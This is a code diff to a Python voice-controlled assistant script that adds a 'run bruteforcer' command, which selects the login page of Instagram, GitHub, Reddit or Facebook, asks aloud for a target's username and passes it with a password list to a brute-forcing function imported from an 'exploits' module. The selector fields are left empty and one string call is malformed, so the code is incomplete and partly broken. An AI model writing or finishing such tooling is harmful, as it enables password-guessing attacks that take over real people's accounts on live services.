@@ -5,11 +5,10 @@ import wikipedia #pip install wikipedia
 import webbrowser
 import os
 import smtplib
-from selenium import webdriver
 
 from functions.browser.searchTools import imgsearch,gogsearch,ytsearch
 from functions.browser.tabNavigation import closeTab,switchTab
-from functions.exploits.passwordCracking import webFind
+from functions.exploits.passwordCracking import brutes
 
 engine = pyttsx3.init('sapi5')
 voices = engine.getProperty('voices')
@@ -155,9 +154,38 @@ if __name__ == "__main__":
                 switchTab()
             except Exception as e:
                 print(e)
-                speak("Exception was raised")
+                speak("Apologies toad, an exception error has been raised")
 
-        """elif 'Run Bruteforcer' in query:
+        elif 'run bruteforcer' in query:
             try:
-                speak("Which website shall i target?")
-                website = webFind(query)"""
+                query = query.replace("run bruteforcer on")
+                if 'instagram' in query:
+                    website = 'https://www.instagram.com/accounts/login/'
+                    user_selector = ''
+                    pass_selector = ''
+                    enter = ''
+                elif 'github' in query:
+                    website = 'https://github.com/login'
+                    user_selector = ''
+                    pass_selector = ''
+                    enter = ''
+                elif 'reddit' in query:
+                    website = 'https://www.reddit.com/login/'
+                    user_selector = ''
+                    pass_selector = ''
+                    enter = ''
+                elif 'facebook' in query:
+                    website = 'https://www.facebook.com/login/'
+                    user_selector = ''
+                    pass_selector = ''
+                    enter = ''
+
+                speak('What is the username of the target?')
+                username = takeCommand().lower()
+                passlist = 'testPasslist.txt'
+                brutes(username, user_selector, pass_selector,enter,passlist,website)
+            
+            except Exception as e:
+                print(e)
+                speak("The password has been found or you have been locked out, bruteforcing complete")
+        
